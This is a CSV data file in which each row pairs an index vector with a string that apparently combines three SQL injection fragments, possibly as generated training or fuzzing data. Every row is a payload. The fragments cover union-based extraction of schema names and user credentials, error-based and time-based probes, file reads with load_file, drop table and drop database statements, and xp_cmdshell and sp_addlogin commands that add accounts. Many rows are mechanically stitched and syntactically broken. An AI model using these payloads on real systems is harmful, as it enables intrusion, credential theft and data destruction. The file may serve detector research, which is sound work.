sig_vector,sig_string
"[54, 32, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  create table test like users;"
"[47, 8, 81]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 and(  create table test like users;"
"[54, 4, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3' and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 47, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 32, 1]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) ') or"
"[54, 26, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[55, 56, 54]"," order by 1union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[44, 26, 62]","create table dirs(paths varchar(100), id int) union select 1,1,1,load_file(c:\\boot.ini) 
 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[42, 36, 76]","exec master.dbo.sp_password null,username,password (select @@version） ;insert into users(id,username,password) values('100','new','new');"
"[26, 32, 22]"," union select 1,1,1,load_file(c:\\boot.ini) 
 union select 1,2,(database())  union select 1,2"
"[15, 32, 32]"," and 1=2  union select 1,2,(database())  union select 1,2,(database()) "
"[54, 35, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 delete table dirs union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[41, 32, 62]","exec master.dbo.sp_addlogin username union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 14, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 47, 25]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  updatexml(1,concat(0x7e,(select @@version),0x7e),1) "
"[21, 54, 54]"," select * from users where id=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 18, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 &&union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 26, 1]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,1,1,load_file(c:\\boot.ini) 
') or"
"[19, 32, 82]"," or'1'='1 union select 1,2,(database())  drop table sc3；"
"[54, 32, 57]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) union select 1,@@datadir,3"
"[54, 37, 1]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 WAITFOR DELAY '0:0:5'') or"
"[54, 54, 6]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1)) or "
"[62, 32, 45]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= union select 1,2,(database()) extractvalue(1, concat(0x7e,@@version,0x7e))"
"[54, 32, 30]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  select version()"
"[54, 61, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1=(select name from master.dbo.sysdatabases where id=1)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 27, 0]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 select * from users where id=1'' or"
"[46, 32, 54]","1 union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[20, 32, 23]"," exists (select * from sysobjects) union select 1,2,(database())  union select 1,username,password from users where id=2"
"[26, 78, 6]"," union select 1,1,1,load_file(c:\\boot.ini) 
 = 1 union select 1,2,3  /* 1)) or "
"[78, 5, 82]"," = 1 union select 1,2,3  /*) and  drop table sc3；"
"[44, 54, 5]","create table dirs(paths varchar(100), id int)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3) and "
"[62, 47, 36]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  (select @@version）"
"[21, 25, 47]"," select * from users where id=1  updatexml(1,concat(0x7e,(select @@version),0x7e),1) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[54, 26, 41]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,1,1,load_file(c:\\boot.ini) 
exec master.dbo.sp_addlogin username"
"[54, 82, 61]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3； 1=(select name from master.dbo.sysdatabases where id=1)"
"[78, 54, 72]"," = 1 union select 1,2,3  /*union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 = 2 --"
"[19, 22, 34]"," or'1'='1 union select 1,2 INSERT INTO"
"[82, 51, 20]"," drop table sc3；union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 exists (select * from sysobjects)"
"[24, 21, 54]"," 1=(if((user() regexp '^r'),1,0)) select * from users where id=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 32, 47]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[54, 26, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,1,1,load_file(c:\\boot.ini) 
 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[51, 25, 78]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 updatexml(1,concat(0x7e,(select @@version),0x7e),1)  = 1 union select 1,2,3  /*"
"[78, 26, 82]"," = 1 union select 1,2,3  /* union select 1,1,1,load_file(c:\\boot.ini) 
 drop table sc3；"
"[54, 32, 5]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) ) and "
"[20, 26, 54]"," exists (select * from sysobjects) union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[21, 5, 54]"," select * from users where id=1 ) and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[32, 47, 56]"," union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[54, 82, 64]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3；--"
"[47, 32, 78]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  union select 1,2,(database())  = 1 union select 1,2,3  /*"
"[11, 32, 29]"," ) or  union select 1,2,(database())  drop database db"
"[54, 54, 80]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 and 1=1;"
"[78, 57, 82]"," = 1 union select 1,2,3  /*union select 1,@@datadir,3 drop table sc3；"
"[60, 47, 51]","ord(mid(user(),1,1))=114union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[54, 41, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3exec master.dbo.sp_addlogin usernameunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[35, 32, 21]"," delete table dirs  union select 1,2,(database())  select * from users where id=1 "
"[78, 49, 0]"," = 1 union select 1,2,3  /* union select 1,2,load_file('C://1.txt')'' or"
"[78, 47, 82]"," = 1 union select 1,2,3  /*union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop table sc3；"
"[62, 32, 36]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= union select 1,2,(database())  (select @@version）"
"[6, 19, 54]"," 1)) or  or'1'='1union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 41, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3exec master.dbo.sp_addlogin username 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 55, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 order by 1 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 54, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 54, 57]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,@@datadir,3"
"[54, 67, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3';--union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[78, 43, 57]"," = 1 union select 1,2,3  /*exec master.dbo.xp_cmdshell 'net user username password /add'union select 1,@@datadir,3"
"[5, 32, 54]",") and  union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[27, 32, 54]"," select * from users where id=1 union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[78, 82, 82]"," = 1 union select 1,2,3  /* drop table sc3； drop table sc3；"
"[54, 37, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 WAITFOR DELAY '0:0:5' 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[6, 47, 54]"," 1)) or union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[5, 49, 54]",") and  union select 1,2,load_file('C://1.txt')union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[5, 32, 62]",") and  union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[4, 57, 82]","' and union select 1,@@datadir,3 drop table sc3；"
"[54, 50, 23]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1 = 2 union all select user()  union select 1,username,password from users where id=2"
"[41, 32, 51]","exec master.dbo.sp_addlogin username union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[54, 5, 5]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3) and ) and "
"[20, 49, 36]"," exists (select * from sysobjects) union select 1,2,load_file('C://1.txt') (select @@version）"
"[54, 6, 45]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1)) or extractvalue(1, concat(0x7e,@@version,0x7e))"
"[6, 54, 79]"," 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+"
"[6, 32, 54]"," 1)) or  union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 38, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 (select Count(*) from table)>0union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 55, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 order by 1union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 19, 53]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or'1'='1 if(length(database())=8,sleep(5),1)"
"[54, 32, 24]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  1=(if((user() regexp '^r'),1,0))"
"[54, 25, 47]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 updatexml(1,concat(0x7e,(select @@version),0x7e),1) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 "
"[56, 57, 19]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3 or'1'='1"
"[57, 56, 54]","union select 1,@@datadir,3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[36, 25, 54]"," (select @@version） updatexml(1,concat(0x7e,(select @@version),0x7e),1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[6, 32, 4]"," 1)) or  union select 1,2,(database()) ' and "
"[7, 47, 54]","and 0 ><union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[17, 16, 36]", ' and 1=2 and  (select @@version）
"[54, 51, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[49, 6, 54]"," union select 1,2,load_file('C://1.txt') 1)) or union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[32, 47, 29]"," union select 1,2,(database()) union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  drop database db"
"[54, 45, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3extractvalue(1, concat(0x7e,@@version,0x7e))union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 55, 26]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 order by 1 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[57, 26, 54]","union select 1,@@datadir,3 union select 1,1,1,load_file(c:\\boot.ini) 
union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 39, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3(select IS_SRVROLEMEMBER('sysadmin'))union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[34, 5, 54]"," INSERT INTO) and union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[10, 32, 54]"," + union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[21, 54, 60]"," select * from users where id=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3ord(mid(user(),1,1))=114"
"[34, 32, 80]"," INSERT INTO union select 1,2,(database())  and 1=1;"
"[1, 78, 18]","') or = 1 union select 1,2,3  /* &&"
"[9, 32, 36]"," 1 or  union select 1,2,(database())  (select @@version）"
"[82, 42, 81]"," drop table sc3；exec master.dbo.sp_password null,username,password create table test like users;"
"[54, 8, 33]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3and(  exec master..xp_cmdshell '"
"[62, 54, 36]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 (select @@version）"
"[0, 32, 36]","'' or union select 1,2,(database())  (select @@version）"
"[68, 32, 36]"," */ union select 1,2,(database())  (select @@version）"
"[82, 54, 81]"," drop table sc3；union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 create table test like users;"
"[54, 32, 60]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) ord(mid(user(),1,1))=114"
"[62, 32, 38]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= union select 1,2,(database())  (select Count(*) from table)>0"
"[51, 26, 16]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,1,1,load_file(c:\\boot.ini) 
 and "
"[1, 32, 62]","') or union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 23, 26]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,username,password from users where id=2 union select 1,1,1,load_file(c:\\boot.ini) 
"
"[54, 20, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 exists (select * from sysobjects) create table test like users;"
"[54, 15, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 and 1=2  create table test like users;"
"[82, 5, 81]", drop table sc3；) and  create table test like users;
"[54, 34, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 INSERT INTOunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 32, 39]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) (select IS_SRVROLEMEMBER('sysadmin'))"
"[36, 2, 75]"," (select @@version）‘ ;select 1,2,3;"
"[54, 32, 67]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) ';--"
"[54, 60, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3ord(mid(user(),1,1))=114 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[57, 32, 81]","union select 1,@@datadir,3 union select 1,2,(database())  create table test like users;"
"[57, 32, 1]","union select 1,@@datadir,3 union select 1,2,(database()) ') or"
"[50, 30, 54]"," 1 = 2 union all select user()  select version()union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[62, 81, 54]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= create table test like users;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[62, 32, 63]"," 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= union select 1,2,(database()) 1"
"[54, 25, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 updatexml(1,concat(0x7e,(select @@version),0x7e),1) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[29, 2, 54]"," drop database db‘union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[82, 34, 62]", drop table sc3； INSERT INTO 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[3, 32, 56]","'')) or union select 1,2,(database()) union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[54, 19, 63]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 or'1'='11"
"[43, 32, 51]","exec master.dbo.xp_cmdshell 'net user username password /add' union select 1,2,(database()) union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3"
"[32, 32, 62]"," union select 1,2,(database())  union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[78, 57, 20]"," = 1 union select 1,2,3  /*union select 1,@@datadir,3 exists (select * from sysobjects)"
"[6, 57, 54]"," 1)) or union select 1,@@datadir,3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[7, 32, 54]","and 0 >< union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[24, 32, 54]"," 1=(if((user() regexp '^r'),1,0)) union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[1, 47, 62]","') orunion select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[1, 54, 62]","') orunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[24, 54, 82]"," 1=(if((user() regexp '^r'),1,0))union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3；"
"[54, 13, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 admin' create table test like users;"
"[56, 57, 23]","union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,@@datadir,3 union select 1,username,password from users where id=2"
"[57, 49, 1]","union select 1,@@datadir,3 union select 1,2,load_file('C://1.txt')') or"
"[11, 32, 54]"," ) or  union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 32, 59]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  (select count(*) from admin where len(*)>0)"
"[34, 32, 57]"," INSERT INTO union select 1,2,(database()) union select 1,@@datadir,3"
"[54, 35, 2]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 delete table dirs ‘"
"[3, 32, 80]","'')) or union select 1,2,(database())  and 1=1;"
"[54, 15, 34]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 and 1=2  INSERT INTO"
"[8, 32, 62]","and(  union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[32, 29, 11]"," union select 1,2,(database())  drop database db ) or "
"[59, 82, 62]", (select count(*) from admin where len(*)>0) drop table sc3； 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name=
"[47, 27, 63]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1  select * from users where id=11"
"[54, 32, 32]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  union select 1,2,(database()) "
"[44, 32, 62]","create table dirs(paths varchar(100), id int) union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 62, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 32, 43]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database()) exec master.dbo.xp_cmdshell 'net user username password /add'"
"[54, 51, 37]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 WAITFOR DELAY '0:0:5'"
"[47, 54, 62]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[51, 52, 54]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 sleep(5)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 35, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 delete table dirs  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 30, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 select version() 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[82, 56, 41]"," drop table sc3；union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)exec master.dbo.sp_addlogin username"
"[54, 32, 58]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,(database())  (select count(*) from sysobjects)"
"[49, 32, 54]"," union select 1,2,load_file('C://1.txt') union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[82, 32, 62]"," drop table sc3； union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[54, 50, 33]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 1 = 2 union all select user()  exec master..xp_cmdshell '"
"[6, 33, 54]"," 1)) or  exec master..xp_cmdshell 'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[57, 32, 54]","union select 1,@@datadir,3 union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 34, 62]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 INSERT INTO 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[51, 50, 62]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 1 = 2 union all select user()  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[32, 32, 32]"," union select 1,2,(database())  union select 1,2,(database())  union select 1,2,(database()) "
"[54, 34, 32]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 INSERT INTO union select 1,2,(database()) "
"[47, 43, 3]","union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1 exec master.dbo.xp_cmdshell 'net user username password /add''')) or"
"[54, 40, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3(select IS_MEMBER('db_owner'))union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[28, 32, 54]","(select count(*) from mysql.user)>0 union select 1,2,(database()) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 56, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[51, 18, 54]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 &&union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[20, 32, 56]"," exists (select * from sysobjects) union select 1,2,(database()) union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)"
"[54, 49, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 union select 1,2,load_file('C://1.txt') create table test like users;"
"[54, 82, 23]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 drop table sc3； union select 1,username,password from users where id=2"
"[52, 56, 54]"," sleep(5)union select 1,2,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 52, 3]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 sleep(5)'')) or"
"[54, 44, 54]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3create table dirs(paths varchar(100), id int)union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[12, 44, 62]","1 'create table dirs(paths varchar(100), id int) 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[32, 57, 54]"," union select 1,2,(database()) union select 1,@@datadir,3union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3"
"[54, 35, 81]","union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3 delete table dirs  create table test like users;"
"[4, 32, 57]","' and  union select 1,2,(database()) union select 1,@@datadir,3"
"[51, 32, 62]","union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 0,1),3 union select 1,2,(database())  1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name="
"[26, 32, 32]"," union select 1,1,1,load_file(c:\\boot.ini) 
 union select 1,2,(database())  union select 1,2,(database()) "
